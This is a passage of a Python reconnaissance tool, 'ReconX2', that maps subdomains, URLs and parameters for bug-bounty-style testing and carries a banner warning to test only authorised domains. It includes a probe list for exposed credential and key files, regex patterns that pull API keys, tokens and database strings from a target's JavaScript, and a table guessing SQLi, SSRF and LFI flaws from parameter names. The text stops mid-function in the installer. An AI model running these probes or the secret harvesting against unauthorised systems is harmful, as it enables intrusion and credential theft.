#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                                                                          ║
# ║   ██████╗ ███████╗ ██████╗ ██████╗ ███╗  ██╗ ██╗  ██╗ ██████╗         ║
# ║   ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗ ██║ ╚██╗██╔╝╚════██╗         ║
# ║   ██████╔╝█████╗  ██║     ██║   ██║██╔██╗██║  ╚███╔╝   █████╔╝         ║
# ║   ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚████║  ██╔██╗  ██╔═══╝          ║
# ║   ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚███║ ██╔╝╚██╗ ███████╗         ║
# ║   ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚══╝ ╚═╝  ╚═╝╚══════╝         ║
# ║                                                                          ║
# ║          Full-Depth Async Reconnaissance Framework v2.1.0                 ║
# ║          Subdomain | URLs | Tech | Ports | JS | Files | Reports         ║
# ║                                                                          ║
# ║  USAGE:                                                                  ║
# ║    python3 reconx2.py -d target.com                                     ║
# ║    python3 reconx2.py -d target.com -t 100 --resume                     ║
# ║    python3 reconx2.py -d target.com --skip-heavy --skip-goinstall       ║
# ║    python3 reconx2.py --install-only                                    ║
# ║                                                                          ║
# ║  ⚠  Only test domains you OWN or have written authorization for.        ║
# ╚══════════════════════════════════════════════════════════════════════════╝

import asyncio, sqlite3, subprocess, json, re, os, sys, time, shutil
import argparse, socket, ssl, urllib.request, urllib.parse, urllib.error
import hashlib, textwrap, struct
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Set, Dict, Optional

# ═══════════════════════════════════════════════════════════════════════════
#  VERSION & META
# ═══════════════════════════════════════════════════════════════════════════
VERSION    = "2.5.0"
TOOL_NAME  = "ReconX2"
AUTHOR     = "Vimal T"
CMD        = "reconx2"

# ═══════════════════════════════════════════════════════════════════════════
#  TERMINAL COLORS (no external deps)
# ═══════════════════════════════════════════════════════════════════════════
class C:
    RED     = "\033[38;5;196m"
    GREEN   = "\033[38;5;82m"
    YELLOW  = "\033[38;5;220m"
    CYAN    = "\033[38;5;51m"
    CYAN2   = "\033[38;5;45m"
    BLUE    = "\033[38;5;33m"
    MAGENTA = "\033[38;5;201m"
    ORANGE  = "\033[38;5;208m"
    GRAY    = "\033[38;5;245m"
    WHITE   = "\033[38;5;255m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"
    # Backgrounds
    BG_CYAN  = "\033[48;5;23m"
    BG_RED   = "\033[48;5;52m"
    BG_GREEN = "\033[48;5;22m"

def log(msg):    print(f"{C.GREEN}{C.BOLD}[+]{C.RESET} {msg}")
def info(msg):   print(f"{C.CYAN}[*]{C.RESET} {msg}")
def warn(msg):   print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def error(msg):  print(f"{C.RED}[✗]{C.RESET} {msg}")
def success(msg):print(f"{C.GREEN}[✓]{C.RESET} {C.BOLD}{msg}{C.RESET}")
def found(msg):  print(f"{C.MAGENTA}[»]{C.RESET} {msg}")

def section(title):
    bar = "═" * 54
    ts  = datetime.now().strftime("%H:%M:%S")
    print(f"\n{C.BOLD}{C.BLUE}{bar}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}  ▶  {title}{C.RESET}  {C.DIM}[{ts}]{C.RESET}")
    print(f"{C.BOLD}{C.BLUE}{bar}{C.RESET}\n")

def banner():
    os.system("clear")
    print(f"""{C.CYAN}{C.BOLD}
 ██████╗ ███████╗ ██████╗ ██████╗ ███╗  ██╗██╗  ██╗██████╗
 ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗ ██║╚██╗██╔╝╚════██╗
 ██████╔╝█████╗  ██║     ██║   ██║██╔██╗██║ ╚███╔╝  █████╔╝
 ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚████║ ██╔██╗ ██╔════╝
 ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚███║██╔╝╚██╗███████╗
 ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝╚═╝  ╚══╝╚═╝  ╚═╝╚══════╝{C.RESET}
{C.YELLOW}  ╔══════════════════════════════════════════════════════════╗
  ║   RECON X2  ·  Full-Depth Async Reconnaissance Framework  ║
  ║   Subdomain · URLs · Tech · Ports · JS · Secrets · Reports ║
  ╚══════════════════════════════════════════════════════════╝{C.RESET}
  {C.DIM}  Tool: {TOOL_NAME}  |  v{VERSION}  |  Author: {AUTHOR}  |  cmd: python3 reconx2.py -d <target>{C.RESET}
""")
# ═══════════════════════════════════════════════════════════════════════════
#  ARG PARSER
# ═══════════════════════════════════════════════════════════════════════════
def parse_args():
    p = argparse.ArgumentParser(
        prog=CMD,
        description=f"{TOOL_NAME} — Full-Depth Async Reconnaissance Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C.BOLD}Examples:{C.RESET}
  python3 reconx2.py -d example.com
  python3 reconx2.py -d example.com -t 100 --resume
  python3 reconx2.py -d example.com --skip-heavy
  python3 reconx2.py --install-only

{C.YELLOW}⚠  Only test domains you own or have written authorization for.{C.RESET}
        """
    )
    p.add_argument("-d",  "--domain",       help="Target domain (required for scan)")
    p.add_argument("-o",  "--output",       help="Output directory (default: reconx2_<domain>_<date>)")
    p.add_argument("-t",  "--threads",      type=int, default=50, help="Concurrent threads (default: 50)")
    p.add_argument("-w",  "--wordlist",     help="Wordlist for dir bruting")
    p.add_argument("--resume",             action="store_true", help="Resume previous scan")
    p.add_argument("--install-only",       action="store_true", help="Only install tools, no scan")
    p.add_argument("--skip-install",       action="store_true", help="Skip tool installation")
    p.add_argument("--skip-goinstall",     action="store_true", help="Skip only Go tool installs (use if already installed)")
    p.add_argument("--skip-heavy",         action="store_true", help="Skip slow modules (nuclei, screenshots)")
    p.add_argument("--skip-bruteforce",    action="store_true", help="Skip directory brute forcing")
    p.add_argument("--report-only",        action="store_true", help="Only generate reports from existing output dir")
    p.add_argument("--version",            action="version",    version=f"{TOOL_NAME} v{VERSION}")
    return p.parse_args()

# ═══════════════════════════════════════════════════════════════════════════
#  DATABASE — SQLite for all results
# ═══════════════════════════════════════════════════════════════════════════
class DB:
    def __init__(self, db_path: str):
        self.path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self._init_tables()

    def _init_tables(self):
        self.conn.executescript("""
            CREATE TABLE IF NOT EXISTS meta (
                key TEXT PRIMARY KEY, value TEXT
            );
            CREATE TABLE IF NOT EXISTS subdomains (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                subdomain TEXT UNIQUE,
                source TEXT,
                is_live INTEGER DEFAULT 0,
                status_code TEXT,
                title TEXT,
                server TEXT,
                tech TEXT,
                ip TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS urls (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE,
                source TEXT,
                extension TEXT,
                has_params INTEGER DEFAULT 0,
                status_code TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS js_files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE,
                has_secret INTEGER DEFAULT 0,
                secrets TEXT,
                endpoints TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS sensitive_paths (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE,
                status_code TEXT,
                risk_level TEXT,
                notes TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS parameters (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                param TEXT UNIQUE,
                count INTEGER DEFAULT 1,
                potential_vuln TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS nuclei_findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                severity TEXT,
                template TEXT,
                url TEXT,
                raw TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS dns_records (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                record_type TEXT,
                value TEXT,
                created_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS modules_done (
                module TEXT PRIMARY KEY,
                completed_at TEXT DEFAULT (datetime('now'))
            );
        """)
        self.conn.commit()

    def set_meta(self, key, value):
        self.conn.execute("INSERT OR REPLACE INTO meta(key,value) VALUES(?,?)", (key, str(value)))
        self.conn.commit()

    def get_meta(self, key, default=None):
        row = self.conn.execute("SELECT value FROM meta WHERE key=?", (key,)).fetchone()
        return row[0] if row else default

    def module_done(self, module: str) -> bool:
        return bool(self.conn.execute("SELECT 1 FROM modules_done WHERE module=?", (module,)).fetchone())

    def mark_done(self, module: str):
        self.conn.execute("INSERT OR REPLACE INTO modules_done(module) VALUES(?)", (module,))
        self.conn.commit()

    def add_subdomain(self, sub: str, source: str):
        try:
            self.conn.execute("INSERT OR IGNORE INTO subdomains(subdomain,source) VALUES(?,?)", (sub.lower().strip(), source))
            self.conn.commit()
        except: pass

    def add_subdomains(self, subs: List[str], source: str):
        data = [(s.lower().strip(), source) for s in subs if s.strip()]
        self.conn.executemany("INSERT OR IGNORE INTO subdomains(subdomain,source) VALUES(?,?)", data)
        self.conn.commit()

    def update_subdomain_live(self, sub: str, status: str, title: str, server: str, tech: str):
        self.conn.execute("""
            UPDATE subdomains SET is_live=1, status_code=?, title=?, server=?, tech=?
            WHERE subdomain=?
        """, (status, title, server, tech, sub.lower().strip()))
        self.conn.commit()

    def add_url(self, url: str, source: str):
        if not url.startswith(("http://","https://")): return
        ext = _get_ext(url)
        has_p = 1 if "?" in url else 0
        try:
            self.conn.execute(
                "INSERT OR IGNORE INTO urls(url,source,extension,has_params) VALUES(?,?,?,?)",
                (url.strip(), source, ext, has_p)
            )
            self.conn.commit()
        except: pass

    def add_urls_bulk(self, urls: List[str], source: str):
        data = []
        for u in urls:
            u = u.strip()
            if not u.startswith(("http://","https://")): continue
            data.append((u, source, _get_ext(u), 1 if "?" in u else 0))
        if data:
            self.conn.executemany(
                "INSERT OR IGNORE INTO urls(url,source,extension,has_params) VALUES(?,?,?,?)", data
            )
            self.conn.commit()

    def add_sensitive(self, url: str, code: str, risk: str, notes: str):
        try:
            self.conn.execute(
                "INSERT OR IGNORE INTO sensitive_paths(url,status_code,risk_level,notes) VALUES(?,?,?,?)",
                (url, code, risk, notes)
            )
            self.conn.commit()
        except: pass

    def add_nuclei(self, severity: str, template: str, url: str, raw: str):
        try:
            self.conn.execute(
                "INSERT INTO nuclei_findings(severity,template,url,raw) VALUES(?,?,?,?)",
                (severity, template, url, raw)
            )
            self.conn.commit()
        except: pass

    def add_param(self, param: str, vuln: str):
        try:
            self.conn.execute("""
                INSERT INTO parameters(param,count,potential_vuln) VALUES(?,1,?)
                ON CONFLICT(param) DO UPDATE SET count=count+1
            """, (param.lower().strip(), vuln))
            self.conn.commit()
        except: pass

    def get_subdomains(self, live_only=False) -> List[str]:
        q = "SELECT subdomain FROM subdomains"
        if live_only: q += " WHERE is_live=1"
        return [r[0] for r in self.conn.execute(q).fetchall()]

    def get_live_urls(self) -> List[str]:
        rows = self.conn.execute(
            "SELECT subdomain, status_code FROM subdomains WHERE is_live=1"
        ).fetchall()
        return [f"https://{r[0]}" for r in rows]

    def count(self, table, where="1=1") -> int:
        return self.conn.execute(f"SELECT COUNT(*) FROM {table} WHERE {where}").fetchone()[0]

    def close(self):
        self.conn.close()

# ═══════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═══════════════════════════════════════════════════════════════════════════
def _get_ext(url: str) -> str:
    m = re.search(r'\.([a-zA-Z0-9]{1,6})(\?|$|#)', url)
    return f".{m.group(1)}" if m else ""

def tool_resolve(name: str) -> str:
    """Return absolute executable path, empty string if not found."""
    found = shutil.which(name)
    if found:
        return found
    for c in [
        f"/root/go/bin/{name}",
        f"/home/{os.environ.get('SUDO_USER','kali')}/go/bin/{name}",
        f"/home/kali/go/bin/{name}",
        os.path.expanduser(f"~/go/bin/{name}"),
        f"/usr/local/bin/{name}",
        f"/usr/bin/{name}",
        f"/opt/go/bin/{name}",
    ]:
        if os.path.isfile(c) and os.access(c, os.X_OK):
            link = f"/usr/local/bin/{name}"
            if not os.path.exists(link):
                try: os.symlink(c, link)
                except Exception: pass
            return c
    return ""

def tool_exists(name: str) -> bool:
    """Check all common binary locations, not just $PATH."""
    if shutil.which(name):
        return True
    # Go tools land in ~/go/bin — not always on $PATH under sudo
    for candidate in [
        f"/root/go/bin/{name}",
        f"/home/{os.environ.get('SUDO_USER','kali')}/go/bin/{name}",
        f"/usr/local/bin/{name}",
        f"/opt/go/bin/{name}",
    ]:
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            # Symlink into /usr/local/bin so it works everywhere
            link = f"/usr/local/bin/{name}"
            if not os.path.exists(link):
                try: os.symlink(candidate, link)
                except Exception: pass
            return True
    return False

async def run_cmd(cmd: List[str], timeout: int = 300,
                  stdin_data: str = None, capture_stderr: bool = False) -> str:
    """Run command, return stdout (and optionally stderr)."""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,   # always capture stderr
            stdin=asyncio.subprocess.PIPE if stdin_data else None
        )
        out, err = await asyncio.wait_for(
            proc.communicate(stdin_data.encode() if stdin_data else None),
            timeout=timeout
        )
        stdout_str = out.decode("utf-8", errors="ignore").strip()
        stderr_str = err.decode("utf-8", errors="ignore").strip()
        if capture_stderr:
            return stdout_str + " " + stderr_str
        return stdout_str
    except asyncio.TimeoutError:
        return ""
    except FileNotFoundError:
        return ""
    except Exception:
        return ""

def run_cmd_sync(cmd: List[str], timeout: int = 300, stdin_data: str = None) -> str:
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            input=stdin_data
        )
        return result.stdout.strip()
    except Exception:
        return ""

async def http_get(url: str, timeout: int = 10) -> Optional[str]:
    loop = asyncio.get_event_loop()
    def _get():
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "ReconX2/3.0"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.read().decode("utf-8", errors="ignore")
        except: return None
    return await loop.run_in_executor(None, _get)

async def http_head(url: str, timeout: int = 8) -> Optional[int]:
    loop = asyncio.get_event_loop()
    def _head():
        try:
            req = urllib.request.Request(
                url, method="HEAD",
                headers={"User-Agent": "Mozilla/5.0 (ReconX2/2.1.0)"}
            )
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status
        except urllib.error.HTTPError as e:
            return e.code
        except: return None
    return await loop.run_in_executor(None, _head)

def write_file(path: str, lines: List[str]):
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

def read_file(path: str) -> List[str]:
    try:
        with open(path, encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip()]
    except: return []

def risk_info(url: str, code: str):
    u = url.lower()
    if any(x in u for x in [".env","/.git","wp-config","id_rsa","dump.sql",".bak","backup.zip",".htpasswd","private.key"]):
        return "CRITICAL", "May expose credentials / source code / keys"
    if any(x in u for x in ["admin","login","swagger","actuator/env","phpinfo","graphql","h2-console","/console","actuator/metrics"]):
        return "HIGH", "Admin / debug panel or API documentation exposure"
    if any(x in u for x in ["api","debug","test","dev","staging","metrics","/actuator"]):
        return "MEDIUM", "Development or internal endpoint exposed"
    if code == "403":
        return "LOW", "Resource exists but access denied"
    return "INFO", "Notable response"

def param_vuln(p: str) -> str:
    p = p.lower()
    if p in ["url","redirect","redirect_url","next","return","goto","dest","destination","target","link","rurl","continue"]:
        return "⚠ Open Redirect"
    if p in ["id","uid","user_id","userid","product_id","item","cat","category","order","pid","tid","rid","oid"]:
        return "⚠ SQLi / IDOR"
    if p in ["q","query","search","s","keyword","term","text","message","comment","name","title","content"]:
        return "⚠ XSS"
    if p in ["file","path","page","include","doc","document","load","read","template","filename","filepath"]:
        return "⚠ LFI / Path Traversal"
    if p in ["url","uri","src","source","host","endpoint","proxy","callback","webhook","fetch","to","from"]:
        return "⚠ SSRF"
    return "—"

SECRET_PATTERNS = [
    # AWS
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key ID"),
    (r"ASIA[0-9A-Z]{16}", "AWS Temp Access Key"),
    (r"AROA[0-9A-Z]{16}", "AWS Role ID"),
    # Google
    (r"AIza[0-9A-Za-z\-_]{35}", "Google API Key"),
    (r"ya29\.[0-9A-Za-z\-_]+", "Google OAuth Token"),
    # Stripe
    (r"sk_(live|test)_[0-9a-zA-Z]{24,}", "Stripe Secret Key"),
    (r"pk_(live|test)_[0-9a-zA-Z]{24,}", "Stripe Publishable Key"),
    (r"rk_(live|test)_[0-9a-zA-Z]{24,}", "Stripe Restricted Key"),
    (r"whsec_[a-zA-Z0-9]{32,}", "Stripe Webhook Secret"),
    # Slack
    (r"xox[baprs]-[0-9]{10,}-[0-9A-Za-z]{24,}", "Slack Token"),
    (r"https://hooks\.slack\.com/services/[A-Za-z0-9/+]{44}", "Slack Webhook URL"),
    # SendGrid / Twilio
    (r"SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}", "SendGrid API Key"),
    (r"SK[0-9a-fA-F]{32}", "Twilio Auth Token"),
    (r"AC[0-9a-fA-F]{32}", "Twilio SID"),
    # GitHub
    (r"ghp_[a-zA-Z0-9]{36,}", "GitHub Personal Access Token"),
    (r"gho_[a-zA-Z0-9]{36,}", "GitHub OAuth Token"),
    (r"ghs_[a-zA-Z0-9]{36,}", "GitHub App Token"),
    (r"ghr_[a-zA-Z0-9]{36,}", "GitHub Refresh Token"),
    # GitLab
    (r"glpat-[0-9a-zA-Z\-]{20}", "GitLab Personal Token"),
    # JWT
    (r"eyJ[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}", "JWT Token"),
    # Private Keys
    (r"-----BEGIN (RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY( BLOCK)?-----", "Private Key"),
    # DB Connection Strings
    (r"mongodb(\+srv)?://[^:]+:[^@\s]{3,}@[^\s'\"]+", "MongoDB Connection String"),
    (r"postgres(ql)?://[^:]+:[^@\s]{3,}@[^\s'\"]+", "PostgreSQL Connection String"),
    (r"mysql://[^:]+:[^@\s]{3,}@[^\s'\"]+", "MySQL Connection String"),
    (r"redis://:[^@]{3,}@[^\s'\"]+", "Redis Connection String"),
    (r"amqp://[^:]+:[^@]{3,}@[^\s'\"]+", "RabbitMQ Connection String"),
    # Firebase
    (r"firebase[^\n]{0,60}AIza[0-9A-Za-z\-_]{35}", "Firebase API Key"),
    (r"AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}", "Firebase Cloud Messaging Key"),
    # Azure
    (r"AccountKey=[a-zA-Z0-9+/=]{88}", "Azure Storage Account Key"),
    # NPM
    (r"//registry\.npmjs\.org/:_authToken=[a-zA-Z0-9\-_\.]{36,}", "NPM Auth Token"),
    # Hardcoded passwords (strict: quotes required, 8+ chars)
    (r"(?i)(?:password|passwd|pwd)\s*[=:]\s*['\"][^'\"\\s]{8,}['\"]", "Hardcoded Password"),
    # Hardcoded API keys (strict: quotes + 16+ chars)
    (r"(?i)api[_\-]?key\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,}['\"]", "Hardcoded API Key"),
    (r"(?i)api[_\-]?secret\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,}['\"]", "Hardcoded API Secret"),
    (r"(?i)access[_\-]?token\s*[=:]\s*['\"][a-zA-Z0-9_\-\.]{20,}['\"]", "Hardcoded Access Token"),
    (r"(?i)client[_\-]?secret\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,}['\"]", "Hardcoded Client Secret"),
    (r"(?i)secret[_\-]?key\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,}['\"]", "Hardcoded Secret Key"),
    (r"(?i)auth[_\-]?token\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,}['\"]", "Hardcoded Auth Token"),
    (r"(?i)private[_\-]?key\s*[=:]\s*['\"][a-zA-Z0-9_\-/+]{30,}['\"]", "Hardcoded Private Key"),
    # Internal endpoints hardcoded in JS
    (r"https?://(?:localhost|127\.0\.0\.1|192\.168\.[0-9]+\.[0-9]+|10\.[0-9]+\.[0-9]+\.[0-9]+)(?::[0-9]+)?/\S+", "Internal Endpoint"),
    (r"https?://[a-zA-Z0-9\-]+\.(?:staging|dev|test|internal|backend|admin)\.[a-zA-Z]+/\S*", "Dev/Internal URL"),
    # SSH
    (r"ssh-rsa\s+AAAA[a-zA-Z0-9+/=]+", "SSH Public Key"),
    # Misc
    (r"(?i)webhook\s*[=:]\s*['\"]?(https://[^'\"\\s]+)['\"]?", "Webhook URL"),
    (r"(?i)consumer_secret\s*[=:]\s*['\"][a-zA-Z0-9_\-]{10,}['\"]", "OAuth Consumer Secret"),
    (r"(?i)encryption_key\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,}['\"]", "Hardcoded Encryption Key"),
    (r"(?i)database_url\s*[=:]\s*['\"][^'\"]+['\"]", "Database URL"),
    (r"(?i)connection_string\s*[=:]\s*['\"][^'\"]+['\"]", "Connection String"),
]


SENSITIVE_PATHS = [
    "/.env","/.env.bak","/.env.local","/.env.production","/.env.dev",
    "/.git/config","/.git/HEAD","/.git/FETCH_HEAD","/.git/index",
    "/wp-config.php","/wp-login.php","/wp-admin","/wp-admin/admin-ajax.php",
    "/config.php","/config.yml","/config.yaml","/config.json","/config.xml",
    "/robots.txt","/sitemap.xml","/crossdomain.xml","/clientaccesspolicy.xml",
    "/.well-known/security.txt","/security.txt",
    "/phpinfo.php","/info.php","/test.php","/debug.php","/status.php",
    "/admin","/administrator","/login","/portal","/dashboard",
    "/api","/api/v1","/api/v2","/api/v3","/api/swagger",
    "/swagger","/swagger-ui.html","/swagger-ui","/api-docs","/openapi.json",
    "/actuator","/actuator/env","/actuator/health","/actuator/metrics",
    "/actuator/mappings","/actuator/beans","/actuator/httptrace",
    "/server-status","/server-info","/.htaccess","/.htpasswd",
    "/.DS_Store","/backup.zip","/backup.tar.gz","/dump.sql","/database.sql",
    "/db.sql","/data.sql","/backup.sql",
    "/id_rsa","/id_rsa.pub","/private.key","/server.key",
    "/package.json","/composer.json","/Gemfile","/requirements.txt","/yarn.lock",
    "/web.config","/app.config","/appsettings.json",
    "/graphql","/graphiql","/__graphql","/v1/graphql","/api/graphql",
    "/metrics","/health","/status","/ping","/version","/info",
    "/console","/h2-console","/django-admin","/phpmyadmin","/pma",
    "/jenkins","/jira","/confluence","/gitlab",
    "/.svn/entries","/.bzr/README","/.hg/hgrc",
    "/trace","/debug","/trace.axd","/elmah.axd",
]

# ═══════════════════════════════════════════════════════════════════════════
#  INSTALLER — pre-built binaries (fast, seconds not minutes)
# ═══════════════════════════════════════════════════════════════════════════

# Pre-built binary download URLs — no compilation needed
# GitHub repos for each tool — we resolve the real download URL at runtime
# via the GitHub releases API, so version changes never break installs
TOOL_REPOS = {
    "subfinder":  ("projectdiscovery/subfinder",  ["linux","amd64"],    ".zip"),
    "httpx":      ("projectdiscovery/httpx",       ["linux","amd64"],    ".zip"),
    "katana":     ("projectdiscovery/katana",      ["linux","amd64"],    ".zip"),
    "nuclei":     ("projectdiscovery/nuclei",      ["linux","amd64"],    ".zip"),
    "naabu":      ("projectdiscovery/naabu",       ["linux","amd64"],    ".zip"),
    "waybackurls":("tomnomnom/waybackurls",        ["linux","amd64"],    ".tgz"),
    "assetfinder":("tomnomnom/assetfinder",        ["linux","amd64"],    ".tgz"),
    "anew":       ("tomnomnom/anew",               ["linux","amd64"],    ".tgz"),
    "gau":        ("lc/gau",                       ["linux","amd64"],    ".tar.gz"),
    "ffuf":       ("ffuf/ffuf",                    ["linux","amd64"],    ".tar.gz"),
    "gobuster":   ("OJ/gobuster",                  ["linux","amd64"],    ".tar.gz"),
    "hakrawler":  ("hakluke/hakrawler",            ["linux","amd64"],    ".zip"),
    "gowitness":  ("sensepost/gowitness",          ["linux","amd64"],    ".zip"),
    "feroxbuster":("epi052/feroxbuster",           ["linux"],            ".zip"),
}

# Known fallback URLs (used if API is rate-limited or unavailable)
FALLBACK_URLS = {
    "subfinder":   "https://github.com/projectdiscovery/subfinder/releases/latest/download/subfinder_linux_amd64.zip",
    "httpx":       "https://github.com/projectdiscovery/httpx/releases/latest/download/httpx_linux_amd64.zip",
    "katana":      "https://github.com/projectdiscovery/katana/releases/latest/download/katana_linux_amd64.zip",
    "nuclei":      "https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip",
    "naabu":       "https://github.com/projectdiscovery/naabu/releases/latest/download/naabu_linux_amd64.zip",
    "waybackurls": "https://github.com/tomnomnom/waybackurls/releases/latest/download/waybackurls-linux-amd64-0.1.0.tgz",
    "assetfinder": "https://github.com/tomnomnom/assetfinder/releases/latest/download/assetfinder-linux-amd64-0.1.1.tgz",
    "anew":        "https://github.com/tomnomnom/anew/releases/latest/download/anew-linux-amd64-0.1.1.tgz",
    "gau":         "https://github.com/lc/gau/releases/latest/download/gau_linux_amd64.tar.gz",
    "ffuf":        "https://github.com/ffuf/ffuf/releases/latest/download/ffuf_2.1.0_linux_amd64.tar.gz",
    "gobuster":    "https://github.com/OJ/gobuster/releases/latest/download/gobuster_linux_amd64.tar.gz",
    "hakrawler":   "https://github.com/hakluke/hakrawler/releases/latest/download/hakrawler_linux_amd64.zip",
    "gowitness":   "https://github.com/sensepost/gowitness/releases/latest/download/gowitness_linux_amd64.zip",
    "feroxbuster": "https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-linux-feroxbuster.zip",
}

def resolve_download_url(name: str) -> str:
    """Use GitHub releases API to find the real latest download URL."""
    if name not in TOOL_REPOS:
        return FALLBACK_URLS.get(name, "")
    repo, keywords, ext = TOOL_REPOS[name]
    try:
        api_url = f"https://api.github.com/repos/{repo}/releases/latest"
        req = urllib.request.Request(
            api_url,
            headers={"User-Agent": "ReconX2/2.1.0",
                     "Accept": "application/vnd.github.v3+json"}
        )
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
        assets = data.get("assets", [])
        for asset in assets:
            url = asset.get("browser_download_url", "")
            url_l = url.lower()
            # Skip checksums/signatures
            if any(url_l.endswith(s) for s in [".sha256",".md5",".sig",".pem",".txt"]):
                continue
            # Must match all keywords
            if all(kw in url_l for kw in keywords):
                return url
    except Exception:
        pass
    return FALLBACK_URLS.get(name, "")


class Installer:
    def __init__(self):
        self.real_user = os.environ.get("SUDO_USER", os.environ.get("USER", "root"))
        self.real_home = os.path.expanduser(f"~{self.real_user}")
        self.install_dir = "/usr/local/bin"

    # ── helpers ─────────────────────────────────────────────────────────────
    def _apt(self, *packages):
        try:
            subprocess.run(
                ["apt-get","install","-y","-qq","--no-install-recommends"] + list(packages),
                capture_output=True, timeout=120
            )
        except Exception as e:
            warn(f"apt: {e}")

    def _pip(self, *packages):
        try:
            subprocess.run(
                [sys.executable,"-m","pip","install",
                 "--break-system-packages","-q","--no-warn-script-location"] + list(packages),
                capture_output=True, timeout=120
            )
        except Exception as e:
            warn(f"pip: {e}")

    def _install_binary(self, name: str, _=None) -> tuple:
        """Download pre-built binary. Returns (name, status, elapsed_secs)."""
        dest = f"{self.install_dir}/{name}"

        # Check all common install paths
        if shutil.which(name) or os.path.exists(dest) or os.path.exists(f"/home/{self.real_user}/go/bin/{name}"):
            # Make sure it's on PATH
            go_bin = f"/home/{self.real_user}/go/bin/{name}"
            if os.path.exists(go_bin) and not os.path.exists(dest):
                try:
                    os.symlink(go_bin, dest)
                except Exception: pass
            return (name, "skip", 0)

        t0 = time.time()

        # Resolve real URL via GitHub API
        url = resolve_download_url(name)
        if not url:
            return (name, "fail-no-url", 0)

        tmp         = f"/tmp/_rx2_{name}"
        extract_dir = f"/tmp/_rx2_ext_{name}"

        try:
            # Download
            req = urllib.request.Request(url, headers={"User-Agent":"ReconX2/2.1.0"})
            with urllib.request.urlopen(req, timeout=90) as resp:
                data = resp.read()

            elapsed = int(time.time() - t0)

            # Single raw binary (no archive)
            url_l = url.lower()
            if not any(url_l.endswith(x) for x in [".zip",".tar.gz",".tgz",".tar.bz2"]):
                with open(dest, "wb") as f:
                    f.write(data)
                os.chmod(dest, 0o755)
                return (name, "ok", elapsed)

            # Write archive
            with open(tmp, "wb") as f:
                f.write(data)

            os.makedirs(extract_dir, exist_ok=True)

            # Extract
            if url_l.endswith(".zip"):
                import zipfile
                with zipfile.ZipFile(tmp) as z:
                    z.extractall(extract_dir)
            else:
                import tarfile
                with tarfile.open(tmp) as t:
                    t.extractall(extract_dir)

            # Find the binary
            found_bin = None
            for root, dirs, files in os.walk(extract_dir):
                for fname in files:
                    if fname.lower() == name.lower():
                        found_bin = os.path.join(root, fname)
                        break
                if found_bin: break

            # Fallback: first executable file
            if not found_bin:
                for root, dirs, files in os.walk(extract_dir):
                    for fname in files:
                        fp = os.path.join(root, fname)
                        if (not fname.endswith((".txt",".md",".LICENSE",".sha256"))
                                and os.path.isfile(fp)):
                            found_bin = fp
                            break
                    if found_bin: break

            if found_bin:
                shutil.copy2(found_bin, dest)
                os.chmod(dest, 0o755)

            # Cleanup
            for p in [tmp, extract_dir]:
                try:
                    if os.path.isfile(p): os.remove(p)
                    elif os.path.isdir(p): shutil.rmtree(p, ignore_errors=True)
                except Exception: pass

            elapsed = int(time.time() - t0)
            if os.path.exists(dest) and os.path.getsize(dest) > 1000:
                return (name, "ok", elapsed)
            else:
